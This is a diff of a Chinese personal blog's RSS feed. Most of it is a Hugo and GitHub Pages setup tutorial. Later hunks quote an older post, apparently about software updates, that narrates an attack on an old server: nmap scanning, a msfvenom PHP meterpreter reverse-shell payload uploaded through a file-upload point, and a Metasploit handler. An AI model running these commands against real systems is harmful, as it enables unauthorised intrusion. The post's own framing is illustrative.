+    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://myhugosite.com/index.xml&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;rel&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;alternate&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/rss+xml&amp;#34;&lt;/span&gt;
+
+
+[&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;]
+    [&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;en&lt;/span&gt;]
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;languagename&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;English&amp;#34;&lt;/span&gt;
+
+        [&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;en&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;]
+
+            [[&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;en&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;]]
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;About&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;about/&amp;#34;&lt;/span&gt;
+
+            [[&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;en&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;]]
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Blog&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;posts/&amp;#34;&lt;/span&gt;
+
+            [[&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;en&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;]]
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Projects&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;projects/&amp;#34;&lt;/span&gt;
+
+            [[&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;en&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;]]
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Contact me&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;contact/&amp;#34;&lt;/span&gt;
+
+
+    [&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;br&lt;/span&gt;]
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;languagename&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Português&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;João Ninguém&amp;#34;&lt;/span&gt;
+
+        [&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;br&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;]
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;author&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;João Ninguém&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Full Stack DevOps e Mágico&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;description&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sítio pessoal de João Ninguém&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;keywords&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;blog,desenvolvedor,pessoal&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;footercontent&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Coloque algum texto aqui.&amp;#34;&lt;/span&gt;
+
+        [&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;br&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;]
+
+            [[&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;br&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;]]
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sobre&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;about/&amp;#34;&lt;/span&gt;
+
+            [[&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;br&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;]]
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Blog&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;posts/&amp;#34;&lt;/span&gt;
+
+            [[&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;br&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;]]
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Projetos&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;projects/&amp;#34;&lt;/span&gt;
+
+            [[&lt;span style=&#34;color:#a6e22e&#34;&gt;languages&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;br&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;]]
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Contato&amp;#34;&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;contact/&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里将文件里的注释翻译了一下。&lt;/p&gt;
+&lt;p&gt;关于这个主题的详细文档可以阅读&lt;a href=&#34;https://github.com/luizdepra/hugo-coder/wiki/Configurations&#34;&gt;这个链接&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;根据自己的需要和说明修改配置文件就可以啦～&lt;/p&gt;
+&lt;h2 id=&#34;写博客&#34;&gt;写博客&lt;/h2&gt;
+&lt;p&gt;首先我们需要创建一个 &lt;code&gt;*.md&lt;/code&gt; 文件，我们可以用 &lt;code&gt;hugo new&lt;/code&gt; 来生成一个，因为不同主题它的空白格式都不一样&lt;/p&gt;
+&lt;p&gt;这个是本站的空白格式&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;---
+title: &amp;#34;Test&amp;#34;
+date: 2020-10-22T17:08:31+08:00
+draft: true
+---
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个是 coder 主题的空白格式&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;+++ 
+draft = true
+date = 2020-10-22T17:09:47+08:00
+title = &amp;#34;&amp;#34;
+description = &amp;#34;&amp;#34;
+slug = &amp;#34;&amp;#34;
+authors = []
+tags = []
+categories = []
+externalLink = &amp;#34;&amp;#34;
+series = []
++++
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还是有区别的对吧，因此我们需要这样子&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ hugo new posts/helloworld.md
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果终端返回一条这样的信息:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;/home/weepingdogel/test/content/posts/helloworld.md created
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;就说明文件建立成功了，接下来只需要编辑这个文件就可以写了～&lt;/p&gt;
+&lt;p&gt;对了，写博客需要使用 &lt;a href=&#34;https://www.runoob.com/markdown/md-tutorial.html&#34;&gt;MarkDown 语法&lt;/a&gt;，如果不了解的可以点击链接学一下哦～&lt;/p&gt;
+&lt;p&gt;我就象征性的随便写一个吧～&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;+++ 
+draft = false
+date = 2020-10-22T17:09:47+08:00
+title = &amp;#34;HELLO WORLD&amp;#34;
+description = &amp;#34;&amp;#34;
+slug = &amp;#34;&amp;#34;
+authors = []
+tags = []
+categories = []
+externalLink = &amp;#34;&amp;#34;
+series = []
++++
+
+&lt;span style=&#34;color:#75715e&#34;&gt;## Hello World
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;font-weight:bold&#34;&gt;**It&amp;#39;s my first blog!**&lt;/span&gt;
+&amp;gt;```c
+&lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;#include&amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;int main(){
+&lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;  printf(&amp;#34;Hello World&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;  return 0;
+&lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;&lt;/span&gt;&amp;gt;}
+&amp;gt;```
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2020-10-22_17-31.png&#34; alt=&#34;&#34;&gt;
+记得把 &lt;code&gt;draft&lt;/code&gt; 后面的内个改成 &lt;code&gt;false&lt;/code&gt; 哦，不然它会被默认识别为草稿，不会被发布的。&lt;/p&gt;
+&lt;h2 id=&#34;发布到-github&#34;&gt;发布到 Github&lt;/h2&gt;
+&lt;p&gt;写完了以后，我们发现现在只能在&lt;code&gt;127.0.0.1：1313&lt;/code&gt;这个本地链接中预览，别人是看不到的。&lt;/p&gt;
+&lt;p&gt;接下來我们还得把它放到 Github 上去才行。&lt;/p&gt;
+&lt;p&gt;先生成静态文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ hugo --theme=hugo-coder
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;返回出以下内容&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Start building sites … 
+
+                   | EN | PT-BR  
+-------------------+----+--------
+  Pages            | 57 |    25  
+  Paginator pages  |  0 |     0  
+  Non-page files   |  0 |     0  
+  Static files     |  0 |     0  
+  Processed images |  0 |     0  
+  Aliases          | 21 |     9  
+  Sitemaps         |  2 |     1  
+  Cleaned          |  0 |     0  
+
+Total in 237 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;进入 &lt;code&gt;public&lt;/code&gt; 目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cd public/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下來我们需要做的就是把这个目录里所有文件 pull 到 &lt;code&gt;你的GitHub用户名.github.io&lt;/code&gt; 这个库里面去，其实很简单..&lt;/p&gt;
+&lt;p&gt;初始化仓库&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ git init
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;添加文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ git add -A
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;作出提交请求&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ git commit -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;随便写点啥&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;添加你的 Github 仓库地址&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ git remote add origin https://github.com/你的Github用户名/你的Github用户名.github.io.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用 http 的方式提交&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ git push -u origin master
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下來输入你的帐号密码，就会自动提交到仓库了，接下來等一会儿，你的博客就能通过这个链接被访问了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;https://你的Github用户名.github.io/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;结语&#34;&gt;结语&lt;/h2&gt;
+&lt;p&gt;这个坑终于填完了。&lt;/p&gt;
+&lt;p&gt;对，这次也是很水的，而且还偷懒了，写得不太详细，看完还是不会的，在下面留言就好..&lt;/p&gt;
+&lt;p&gt;qwq&lt;/p&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://gohugo.io/documentation/&#34;&gt;Hugo Documentation | Hugo&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://themes.gohugo.io/&#34;&gt;Complete List | Hugo Themes&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://themes.gohugo.io/hugo-coder/&#34;&gt;Hugo Coder | Hugo Themes&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/luizdepra/hugo-coder/wiki/Configurations&#34;&gt;Configurations · luizdepra/hugo-coder Wiki · GitHub&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.runoob.com/markdown/md-tutorial.html&#34;&gt;Markdown 教程 | 菜鸟教程&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+- https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/ - WeepingDogel 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
     
     
     
@@ -21,7 +446,7 @@
         <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/2020-09-26/ -&lt;blockquote&gt;
 &lt;p&gt;虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h2 id=&#34;开场白&#34;&gt;开场白&lt;/h2&gt;
+&lt;h2 id=&#34;序&#34;&gt;序&lt;/h2&gt;
 &lt;p&gt;最近总听到一些声音。&lt;/p&gt;
 &lt;p&gt;一些关于软件更新的、不同的声音。&lt;/p&gt;
 &lt;p&gt;一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写&lt;/p&gt;
@@ -60,9 +485,9 @@
 &lt;/blockquote&gt;
 &lt;h2 id=&#34;攻击过程&#34;&gt;攻击过程&lt;/h2&gt;
 &lt;p&gt;总有人喜欢搞破坏，一名黑客对服务器进行了扫描&amp;hellip;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ sudo nmap -O -v 192.168.0.116
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果是这样的&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Nmap scan report for 192.168.0.116
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo nmap -O -v 192.168.0.116
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果是这样的&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Nmap scan report for 192.168.0.116
 Host is up (0.00028s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE
@@ -82,55 +507,55 @@ Read data files from: /usr/bin/../share/nmap
 OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
            Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;他惊讶地发现内核版本居然才 &lt;code&gt;2.6.32&lt;/code&gt;，这样的事他还是第一次见。&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;他惊讶地发现内核版本居然才 &lt;code&gt;2.6.32&lt;/code&gt;，这样的事他还是第一次见。&lt;/p&gt;
 &lt;p&gt;除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。&lt;/p&gt;
 &lt;p&gt;他试图访问了网站，在网站上发现了一个文件上传点。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2020-09-26_21-18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;抱着试试看的态度，用 msf 生成了一个 payload&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=4444 -o shell.php
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ msfvenom -p php/meterpreter/reverse_tcp LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.0.109 LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt; -o shell.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
 &lt;img src=&#34;https://weepingdogel.github.io/img/2020-09-26_21-22.png&#34; alt=&#34;&#34;&gt;
 于是他启动了 &lt;code&gt;msfconsole&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ msfconsole
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;并使用  &lt;code&gt;exploit/multi/handler&lt;/code&gt; 这个模块&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf5 &amp;gt; use exploit/multi/handler 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;依次设置好参数&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf5 exploit(multi/handler) &amp;gt; set LHOST 192.168.0.109
-&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;msf5 exploit(multi/handler) &amp;gt; set LPORT 4444
-&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;set payload php/meterpreter/reverse_tcp
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最后一步就是运行模块了，&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf5 exploit(multi/handler) &amp;gt; run
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后 msf 开始监听。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ msfconsole
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;并使用  &lt;code&gt;exploit/multi/handler&lt;/code&gt; 这个模块&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;msf5 &amp;gt; use exploit/multi/handler 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;依次设置好参数&lt;/p&gt;
